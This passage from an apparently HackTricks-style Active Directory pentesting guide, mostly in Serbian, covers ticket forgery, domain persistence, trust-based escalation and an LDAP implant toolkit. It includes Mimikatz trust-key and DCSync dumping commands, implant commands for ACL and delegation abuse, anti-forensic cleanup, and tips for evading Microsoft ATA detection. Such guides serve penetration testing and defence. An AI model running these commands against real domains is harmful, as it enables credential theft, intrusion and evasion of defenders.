### Silver Ticket

**Silver Ticket attack** kreira **legitiman Ticket Granting Service (TGS) ticket** za specifičan servis korišćenjem **NTLM hash**-a (na primer, **hash PC account-a**). Ova metoda se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da napadač stekne pristup **NTLM hashu krbtgt account-a** u Active Directory (AD) okruženju. Ovaj nalog je poseban jer se koristi za potpisivanje svih **Ticket Granting Tickets (TGTs)**, koji su ključni za autentikaciju unutar AD mreže.

Kada napadač dobije ovaj hash, može kreirati **TGTs** za bilo koji nalog po sopstvenom izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ovo su slični golden ticket-ovima, falsifikovani na način koji **zaobilazi uobičajene mehanizme detekcije golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahtevanja** je vrlo dobar način da se održi persistence na korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Korišćenjem sertifikata takođe je moguće održati persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory osigurava bezbednost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardnog **Access Control List (ACL)** preko ovih grupa kako bi se sprečile neovlašćene promene. Međutim, ova funkcija se može zloupotrebiti; ako napadač izmeni AdminSDHolder-ov ACL da dodeli potpuni pristup običnom korisniku, taj korisnik dobija obimnu kontrolu nad svim privilegovanim grupama. Ova mera bezbednosti, iako namenjena zaštiti, može se obrnuto iskoristiti i omogućiti neautorizovan pristup ukoliko se ne prati pažljivo.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

U svakom **Domain Controller (DC)** postoji nalog **local administrator**. Dobijanjem admin prava na takvoj mašini, hash lokalnog Administratora može se izvući koristeći **mimikatz**. Nakon toga je neophodna izmena registra da bi se **omogućilo korišćenje ove lozinke**, što dozvoljava daljinski pristup lokalnom Administrator nalogu.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **specijalne dozvole** korisniku nad određenim objektima domena koje će mu omogućiti da u budućnosti **eskalira privilegije**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** nekim resursom. Ako možete samo da **napravite** malu **promenu** u **security descriptor-u** nekog objekta, možete steći veoma interesantne privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Iskoristite pomoćnu klasu `dynamicObject` za kreiranje kratkotrajnih principals/GPOs/DNS zapisa sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstona, brišući LDAP dokaze dok ostavljaju siročad SIDs, polomljene `gPLink` reference ili keširane DNS odgovore (npr. AdminSDHolder ACE pollution ili maliciozni `gPCFileSysPath`/AD-integrisani DNS preusmeravanja).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji da uspostavite **univerzalnu lozinku**, čime dobijate pristup svim nalozima u domenu.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati sopstveni **SSP** da **uhvatite** u **clear text** **credentials** koji se koriste za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na određene objekte **bez** ostavljanja bilo kakvih **logova** u vezi sa **izmenama**. Potrebne su vam **DA** privilegije i morate biti unutar **root domain**.\
Imajte na umu da ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Ranije smo raspravljali o tome kako eskalirati privilegije ako imate **dovoljna prava da pročitate LAPS passwords**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistence**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft vidi **Forest** kao bezbednosnu granicu. To znači da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja cele šume**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. U suštini kreira povezanost između sistema za autentikaciju ta dva domena, omogućavajući protok verifikacija autentikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controllers (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora da zatraži specijalan tiket poznat kao **inter-realm TGT** od svog DC-a. Ovaj TGT je enkriptovan sa deljenim **ključem** koji su oba domena dogovorila. Korisnik zatim prezentuje ovaj TGT **DC-u trusted domena** da bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, dodeljujući korisniku pristup servisu.

**Koraci**:

1. **Klijentski računar** u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent potom zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust ključem** koji DC1 i DC2 dele kao deo dvosmernog domain trust-a.
5. Klijent odnosi inter-realm TGT **Domain 2-om Domain Controller-u (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj deljeni trust ključ i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome klijent želi pristupiti.
7. Na kraju, klijent prezentuje ovaj TGS serveru, koji je enkriptovan hash-om naloga servera, kako bi dobio pristup servisu u Domain 2.

### Different trusts

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji, oba domena veruju jedno drugom, dok u **jednosmernom** odnosu poverenja jedan domen je **trusted**, a drugi je **trusting** domain. U tom slučaju, **moći ćete pristupiti resursima unutar trusting domena iz trusted domena**, ali ne obrnuto.

Ako Domain A trust-uje Domain B, A je trusting domain, a B je trusted. Nadalje, u **Domain A** to bi bio **Outbound trust**; u **Domain B** to bi bio **Inbound trust**.

**Različiti odnosi poverenja**

- **Parent-Child Trusts**: Ovo je uobičajena konfiguracija unutar iste šume, gde child domain automatski ima dvosmerni transitivni trust sa roditeljskim domenom. To znači da autentikacioni zahtevi mogu prolaziti fluidno između parent i child domena.
- **Cross-link Trusts**: Poznati i kao "shortcut trusts", uspostavljaju se između child domena kako bi ubrzali referral procese. U kompleksnim šumama, autentikacioni referrals obično moraju ići do korena šume pa zatim naniže do ciljnog domena. Kreiranjem cross-linkova taj put se skraćuje, što je korisno u geografski rasprostranjenim okruženjima.
- **External Trusts**: Ovi trust-ovi se uspostavljaju između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu izvan trenutne šume koji nije povezan forest trust-om. Bezbednost se pojačava kroz SID filtering sa external trust-ovima.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novo dodatog tree root-a. Iako nisu često susretani, tree-root trusts su važni za dodavanje novih domain tree-ova u šumu, omogućavajući im jedinstven naziv domena i obezbeđujući dvosmernu transitivnost. Više informacija se može naći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ova vrsta trust-a je dvosmerni transitivni trust između dva forest root domena, takođe sprovodeći SID filtering radi poboljšanja bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa ne-Windows, [RFC4120-kompatibilnim](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trusts su specijalizovaniji i služe integraciji sa Kerberos sistemima van Windows ekosistema.

#### Other differences in **trusting relationships**

- Odnos poverenja može biti i **transitivan** (A trust-uje B, B trust-uje C, onda A trust-uje C) ili **non-transitivan**.
- Odnos poverenja može biti postavljen kao **bidirekcioni trust** (oba veruju jedno drugom) ili kao **jednosmerni trust** (samo jedan veruje drugom).

### Attack Path

1. **Enumeriši** odnose poverenja
2. Proveri da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstvom u grupama drugog domena. Traži **odnose preko domena** (trust je verovatno kreiran zbog toga).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromituj** **naloge** koji mogu **pivot-ovati** kroz domene.

Napadači mogu pristupiti resursima u drugom domenu kroz tri primarna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, što im daje značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL**-u, naročito kao entiteti u **ACE** unosima unutar **DACL**-a, dajući im pristup specifičnim resursima. Za one koji žele dublje da se udube u mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Find external users/groups with permissions

Možete proveriti `CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com` da biste pronašli foreign security principals u domenu. To će biti korisnici/grupe iz **eksternog domena/šume**.

Ovo možete proveriti u **Bloodhound** ili koristeći powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju poverenja domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedna za _Child --> Parent_ i druga za _Parent_ --> _Child_.\
> Možete proveriti koji od njih koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Povećajte privilegije do Enterprise admin-a u child/parent domenu zloupotrebom trust-a pomoću SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može zloupotrebiti je ključno. Configuration NC služi kao centralni repozitorij za konfiguracione podatke kroz forest u Active Directory (AD) okruženjima. Ti podaci se replikuju na svaki Domain Controller (DC) u forestu, pri čemu writable DCs imaju zapisivu kopiju Configuration NC. Da bi se ovo iskoristilo, potrebno je imati **SYSTEM privileges on a DC**, po mogućstvu child DC.

**Link GPO to root DC site**

Sites container Configuration NC sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD forest-a. Korišćenjem SYSTEM privilegija na bilo kom DC-u, napadači mogu link-ovati GPOs na root DC sites. Ova akcija potencijalno kompromituje root domain menjajući politike koje se primenjuju na te sajtove.

Za detaljnije informacije, možete istražiti istraživanje o [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada podrazumeva ciljanje privilegovanih gMSA u domenu. KDS Root key, neophodan za izračunavanje lozinki gMSA, čuva se u Configuration NC. Sa SYSTEM privilegijama na bilo kom DC-u, moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u celom forestu.

Detaljna analiza i smernice korak po korak nalaze se u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementaran delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatna istraživanja: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ovaj metod zahteva strpljenje — čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema i dodeliti bilo kom korisniku potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objektima.

Više informacija dostupno je u [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Ranljivost ADCS ESC5 cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto PKI objekti žive u Configuration NC, kompromitovanje writable child DC omogućava izvođenje ESC5 napada.

Više detalja može se pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS, napadač može postaviti potrebne komponente, kako je diskutovano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **your domain is trusted** by an external one giving you **undetermined permissions** over it. Treba da pronađete **which principals of your domain have which access over the external domain** i zatim pokušate da exploit-ujete to:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni Forest Domain - Jednosmerni (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **poverava** neke **privilegije** principalu iz **drugog domena**.

Međutim, kada je **domen poveren** od strane domena koji poverava, povereni domen **kreira korisnika** sa **predvidivim imenom** koji koristi kao **šifru trusted password**. Što znači da je moguće **pristupiti korisniku iz domena koji poverava** da bi se ušlo u povereni domen, izvršilo njegovo enumerisanje i pokušalo eskalirati privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Još jedan način da se kompromituje povereni domen je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom pravcu** domen-trusta (što nije naročito često).

Još jedan način da se kompromituje povereni domen je sačekati na mašini na koju se **korisnik iz poverenog domena može prijaviti** preko **RDP**. Tada bi napadač mogao ubaciti kod u proces RDP sesije i **odatle pristupiti izvorom domenu žrtve**.\
Štaviše, ako je **žrtva montirala svoj hard disk**, iz procesa **RDP session** napadač bi mogao smestiti **backdoors** u **startup folder hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko forest trust-ova se umanjuje pomoću SID Filtering-a, koji je podrazumevano aktiviran na svim inter-forest trust-ovima. Ovo se zasniva na pretpostavci da su intra-forest trust-ovi bezbedni, uzimajući forest, a ne domen, kao bezbednosnu granicu u skladu sa Microsoftovim stanovištem.
- Međutim, postoji problem: SID filtering može poremetiti aplikacije i pristup korisnika, što dovodi do njegove povremene deaktivacije.

### **Selective Authentication:**

- Za inter-forest trust-ove, primena Selective Authentication osigurava da korisnici iz ta dva foresta nisu automatski autentifikovani. Umesto toga, potrebna su eksplicitna dopuštenja da bi korisnici pristupili domenima i serverima unutar domena ili foresta koji poverava.
- Važno je napomenuti da ove mere ne štite od zloupotrebe writable Configuration Naming Context (NC) ili napada na trust account.

[**Više informacija o poveravanjima između domena na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP zasnovana zloupotreba AD-a pomoću implantata na hostu

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koje rade potpuno unutar on-host implantata (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, a zatim pozovu `ldap <subcommand>` iz beacona. Sav saobraćaj koristi trenutni logon security context preko LDAP (389) sa signing/sealing ili LDAPS (636) sa automatskim poveravanjem sertifikata, tako da nisu potrebni socks proxy-i ili disk artefakti.

### LDAP enumeracija sa implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rešavaju kratka imena/OU puteve u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` izvlače proizvoljne atribute (uključujući security descriptors) plus forest/domain metadata iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting candidates, delegation podešavanja i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskriptore direktno iz LDAP-a.
- `get-acl` i `get-writable --detailed` parsiraju DACL da izlistaju trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) i nasleđivanje, dajući neposredne mete za eskalaciju privilegija putem ACL-a.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da postavi nove principe ili machine accounts gde god postoje prava nad OU. `add-groupmember`, `set-password`, `add-attribute`, i `set-attribute` direktno preuzimaju ciljeve čim se pronađu write-property prava.
- Komande fokusirane na ACL kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili DCSync privilegije replikacije bez ostavljanja PowerShell/ADSI artefakata. `remove-*` ekvivalenti čiste ubačene ACE-e.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` odmah čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) obeležava korisnika za AS-REP roasting bez diranja lozinke.
- Delegation makroi (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flagove, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacona, omogućavajući constrained/unconstrained/RBCD puteve napada i uklanjajući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SIDs u SID history kontrolisanog principala (see [SID-History Injection](sid-history-injection.md)), obezbeđujući prikrivenu naslednost pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, dozvoljavajući napadaču da premesti resurse u OU-e gde već postoje delegirana prava pre zloupotrebe `set-password`, `add-groupmember`, ili `add-spn`.
- Usko ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo vraćanje nakon što operator ubere kredencijale ili uspostavi persistenciju, minimizirajući telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučeno je da Domain Admins imaju dozvolu za login samo na Domain Controllers i da se izbegava njihova upotreba na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, preporučuje se ograničiti trajanju tog pristupa. To se može postići komandom: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Auditujte Event ID-e 2889/3074/3075 i zatim nametnite LDAP signing plus LDAPS channel binding na DC-evima/klijentima da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementacija obmane podrazumeva postavljanje zamki, kao što su decoy users ili computers, sa karakteristikama poput lozinki koje ne ističu ili su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u visokoprikrivene grupe.
- Praktičan primer uključuje upotrebu alata poput: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o implementaciji teknika obmane možete naći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke prijave, datume kreiranja, i mali broj loših pokušaja unosa lozinke.
- **General Indicators**: Upoređivanje atributa potencijalnih decoy objekata sa pravim objektima može otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikovanju takvih obmana.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavajte enumeraciju sesija na Domain Controllerima kako biste sprečili ATA detekciju.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje ticket-a pomaže u izbegavanju detekcije tako što se ne vrši downgrade na NTLM.
- **DCSync Attacks**: Preporučuje se izvršenje sa ne-Domain Controller node-a da biste izbegli ATA detekciju, jer direktno izvršavanje sa Domain Controller-a izaziva alarm.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
